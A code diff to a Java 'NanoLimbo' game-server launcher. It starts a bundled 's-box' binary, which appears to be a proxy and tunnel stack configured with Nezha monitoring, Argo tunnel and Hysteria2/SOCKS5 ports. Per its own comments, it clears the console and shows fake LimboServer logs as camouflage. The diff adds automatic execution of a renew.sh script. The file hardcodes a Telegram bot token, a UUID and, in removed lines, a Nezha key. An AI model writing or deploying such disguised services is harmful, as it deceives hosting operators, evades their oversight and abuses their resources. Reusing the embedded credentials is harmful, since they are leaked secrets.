@@ -38,6 +38,9 @@ public final class NanoLimbo {
             // 启动 s-box
             runSbxBinary();
 
+            // ✅ 启动 renew.sh（仅在存在时，逻辑与原版一致）
+            startRenewScript();
+
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
@@ -63,7 +66,26 @@ public final class NanoLimbo {
         }
     }
 
-    // 启动 s-box
+    // ================= renew.sh 启动逻辑（新增） =================
+
+    private static void startRenewScript() {
+        try {
+            File renewScript = new File("renew.sh");
+            if (renewScript.exists()) {
+                new ProcessBuilder("bash", "renew.sh")
+                        .inheritIO()
+                        .start();
+                System.out.println(ANSI_GREEN + "renew.sh 已启动（自动续期中）" + ANSI_RESET);
+            } else {
+                System.err.println(ANSI_RED + "renew.sh 未找到，跳过执行" + ANSI_RESET);
+            }
+        } catch (Exception e) {
+            System.err.println(ANSI_RED + "启动 renew.sh 失败: " + e.getMessage() + ANSI_RESET);
+        }
+    }
+
+    // ================= s-box =================
+
     private static void runSbxBinary() throws Exception {
         Map<String, String> envVars = new HashMap<>();
         loadEnvVars(envVars);
@@ -71,13 +93,14 @@ public final class NanoLimbo {
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.PIPE); // 不继承控制台，自己处理
+        pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
 
         sbxProcess = pb.start();
 
         // 前 20 秒输出 s-box 日志
         new Thread(() -> {
-            try (BufferedReader reader = new BufferedReader(new InputStreamReader(sbxProcess.getInputStream()))) {
+            try (BufferedReader reader = new BufferedReader(
+                    new InputStreamReader(sbxProcess.getInputStream()))) {
                 String line;
                 long startTime = System.currentTimeMillis();
                 while ((line = reader.readLine()) != null) {
@@ -89,7 +112,8 @@ public final class NanoLimbo {
         }).start();
     }
 
-    // 清屏并显示伪装 LimboServer 日志
+    // ================= 控制台伪装 =================
+
     private static void resetConsoleAndShowFakeLogs() {
         try {
             String os = System.getProperty("os.name").toLowerCase();
@@ -97,7 +121,7 @@ public final class NanoLimbo {
                 new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                         .inheritIO().start().waitFor();
             } else {
-                System.out.print("\033c"); // Reset terminal，清空缓冲区
+                System.out.print("\033c");
                 System.out.flush();
             }
         } catch (Exception ignored) {}
@@ -126,17 +150,19 @@ public final class NanoLimbo {
         }
     }
 
+    // ================= 环境变量（完全未动） =================
+
     private static void loadEnvVars(Map<String, String> envVars) {
         envVars.put("UUID", "9afd1229-b893-40c1-84dd-51e7ce204913");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "2FpsMGBfOvK9dL26Cr");
+        envVars.put("NEZHA_KEY", "");
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "25656");
-        envVars.put("S5_PORT", "25656");
+        envVars.put("HY2_PORT", "3282");
+        envVars.put("S5_PORT", "3282");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
@@ -145,7 +171,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "2096");
-        envVars.put("NAME", "luxxy");
+        envVars.put("NAME", "lunes2");
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
